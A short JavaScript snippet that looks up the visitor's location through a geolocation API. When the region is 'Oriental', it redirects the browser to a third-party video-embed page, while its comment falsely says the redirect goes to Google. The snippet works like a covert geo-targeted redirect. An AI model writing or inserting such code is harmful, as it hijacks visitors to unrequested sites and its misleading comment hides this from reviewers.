// Fetch the geo data from the API
fetch('https://get.geojs.io/v1/ip/geo.json')
    .then(response => response.json())
    .then(apiResponse => {
        // Check if the region is "Oriental"
        if (apiResponse.region === "Oriental") {
            // Redirect to Google
            window.location.href = "https://upload.aflampro.com/embed/80fn397k18gk";
        }
    })
    .catch(error => {
        console.error('Error fetching geo data:', error);
    });
